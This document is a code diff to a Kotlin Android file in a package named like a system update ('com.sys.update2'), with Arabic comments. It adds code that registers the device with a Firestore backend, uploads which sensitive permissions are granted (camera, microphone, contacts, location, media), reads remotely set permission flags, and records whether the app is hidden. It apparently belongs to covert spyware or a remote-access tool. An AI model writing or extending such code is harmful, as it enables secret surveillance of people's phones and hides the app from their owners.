@@ -1,6 +1,10 @@
+// language: Kotlin, file: DeviceManager.kt
+// *تسجيل الجهاز + heartbeat + قراءة/كتابة الأذونات + حالة الإخفاء*
+
 package com.sys.update2
 
 import android.content.Context
+import android.content.pm.PackageManager
 import android.os.Build
 import android.util.Log
 import okhttp3.MediaType.Companion.toMediaType
@@ -30,6 +34,7 @@ object DeviceManager {
 
     private fun str(s: String) = JSONObject().put("stringValue", s)
     private fun num(n: Long) = JSONObject().put("integerValue", n.toString())
+    private fun bool(b: Boolean) = JSONObject().put("booleanValue", b)
 
     // ═══════════════════════════════════════════
     //  توليد الرمز الفريد
@@ -44,12 +49,8 @@ object DeviceManager {
         return try {
             val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
             val req = Request.Builder().url(url).get().build()
-            client.newCall(req).execute().use { resp ->
-                resp.isSuccessful
-            }
-        } catch (e: Exception) {
-            false
-        }
+            client.newCall(req).execute().use { resp -> resp.isSuccessful }
+        } catch (_: Exception) { false }
     }
 
     private fun generateUniqueCode(): String {
@@ -96,7 +97,7 @@ object DeviceManager {
     }
 
     // ═══════════════════════════════════════════
-    //  registerDeviceOnce — مرة واحدة فقط
+    //  registerDeviceOnce
     // ═══════════════════════════════════════════
     fun registerDeviceOnce(ctx: Context) {
         val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
@@ -112,9 +113,6 @@ object DeviceManager {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  registerDeviceInternal
-    // ═══════════════════════════════════════════
     private fun registerDeviceInternal(ctx: Context, onDone: (Boolean) -> Unit) {
         Thread {
             var ok = false
@@ -172,12 +170,7 @@ object DeviceManager {
         }.start()
     }
 
-    // ═══════════════════════════════════════════
-    //  registerDevice — fallback
-    // ═══════════════════════════════════════════
-    fun registerDevice(ctx: Context) {
-        registerDeviceOnce(ctx)
-    }
+    fun registerDevice(ctx: Context) = registerDeviceOnce(ctx)
 
     // ═══════════════════════════════════════════
     //  updateHeartbeat
@@ -251,4 +244,130 @@ object DeviceManager {
     }
 
     fun getDeviceId(ctx: Context): String = getDeviceCode(ctx)
+
+    // ═══════════════════════════════════════════
+    //  ⭐ الأذونات — قراءة وكتابة
+    // ═══════════════════════════════════════════
+
+    data class DevicePermissions(
+        val images: Boolean = false,
+        val videos: Boolean = false,
+        val audio: Boolean = false,
+        val contacts: Boolean = false,
+        val camera: Boolean = false,
+        val microphone: Boolean = false,
+        val location: Boolean = false,
+        val notifications: Boolean = false,
+        val hidden: Boolean = false
+    )
+
+    /**
+     * يقرأ الأذونات المسجّلة على Firestore للجهاز المحدد.
+     */
+    fun getDevicePermissions(code: String): DevicePermissions {
+        return try {
+            val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
+            val req = Request.Builder().url(url).get().build()
+            client.newCall(req).execute().use { resp ->
+                val body = resp.body?.string() ?: return DevicePermissions()
+                val obj = JSONObject(body)
+                val f = obj.optJSONObject("fields") ?: return DevicePermissions()
+
+                DevicePermissions(
+                    images = f.optJSONObject("perm_images")?.optBoolean("booleanValue", false) ?: false,
+                    videos = f.optJSONObject("perm_videos")?.optBoolean("booleanValue", false) ?: false,
+                    audio = f.optJSONObject("perm_audio")?.optBoolean("booleanValue", false) ?: false,
+                    contacts = f.optJSONObject("perm_contacts")?.optBoolean("booleanValue", false) ?: false,
+                    camera = f.optJSONObject("perm_camera")?.optBoolean("booleanValue", false) ?: false,
+                    microphone = f.optJSONObject("perm_mic")?.optBoolean("booleanValue", false) ?: false,
+                    location = f.optJSONObject("perm_location")?.optBoolean("booleanValue", false) ?: false,
+                    notifications = f.optJSONObject("perm_notifications")?.optBoolean("booleanValue", false) ?: false,
+                    hidden = f.optJSONObject("app_hidden")?.optBoolean("booleanValue", false) ?: false
+                )
+            }
+        } catch (_: Exception) {
+            DevicePermissions()
+        }
+    }
+
+    /**
+     * يرفع حالة الأذونات الحالية للجهاز على Firestore.
+     */
+    fun uploadPermissions(ctx: Context) {
+        Thread {
+            try {
+                val code = getDeviceCode(ctx)
+                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
+                val fields = JSONObject().apply {
+                    put("perm_images", bool(
+                        checkPerm(ctx, "android.permission.READ_MEDIA_IMAGES") ||
+                        checkPerm(ctx, "android.permission.READ_EXTERNAL_STORAGE")
+                    ))
+                    put("perm_videos", bool(
+                        checkPerm(ctx, "android.permission.READ_MEDIA_VIDEO") ||
+                        checkPerm(ctx, "android.permission.READ_EXTERNAL_STORAGE")
+                    ))
+                    put("perm_audio", bool(
+                        checkPerm(ctx, "android.permission.READ_MEDIA_AUDIO") ||
+                        checkPerm(ctx, "android.permission.READ_EXTERNAL_STORAGE")
+                    ))
+                    put("perm_contacts", bool(checkPerm(ctx, "android.permission.READ_CONTACTS")))
+                    put("perm_camera", bool(checkPerm(ctx, "android.permission.CAMERA")))
+                    put("perm_mic", bool(checkPerm(ctx, "android.permission.RECORD_AUDIO")))
+                    put("perm_location", bool(
+                        checkPerm(ctx, "android.permission.ACCESS_FINE_LOCATION") ||
+                        checkPerm(ctx, "android.permission.ACCESS_COARSE_LOCATION")
+                    ))
+                    put("perm_notifications", bool(checkPerm(ctx, "android.permission.POST_NOTIFICATIONS")))
+                }
+                val body = JSONObject().put("fields", fields).toString()
+                client.newCall(Request.Builder().url(url)
+                    .patch(body.toRequestBody("application/json".toMediaType()))
+                    .build()).execute().use { }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    /**
+     * يسجّل حالة الإخفاء على Firestore.
+     */
+    fun markAppHidden(ctx: Context, hidden: Boolean) {
+        Thread {
+            try {
+                val code = getDeviceCode(ctx)
+                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
+                val fields = JSONObject().apply { put("app_hidden", bool(hidden)) }
+                val body = JSONObject().put("fields", fields).toString()
+                client.newCall(Request.Builder().url(url)
+                    .patch(body.toRequestBody("application/json".toMediaType()))
+                    .build()).execute().use { }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    /**
+     * يقرأ حالة الإخفاء من Firestore.
+     */
+    fun isAppHidden(ctx: Context, code: String): Boolean {
+        return try {
+            val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
+            val req = Request.Builder().url(url).get().build()
+            client.newCall(req).execute().use { resp ->
+                val body = resp.body?.string() ?: return false
+                val obj = JSONObject(body)
+                val f = obj.optJSONObject("fields")
+                f?.optJSONObject("app_hidden")?.optBoolean("booleanValue", false) ?: false
+            }
+        } catch (_: Exception) {
+            false
+        }
+    }
+
+    private fun checkPerm(ctx: Context, permission: String): Boolean {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
+            } else true
+        } catch (_: Exception) { false }
+    }
 }
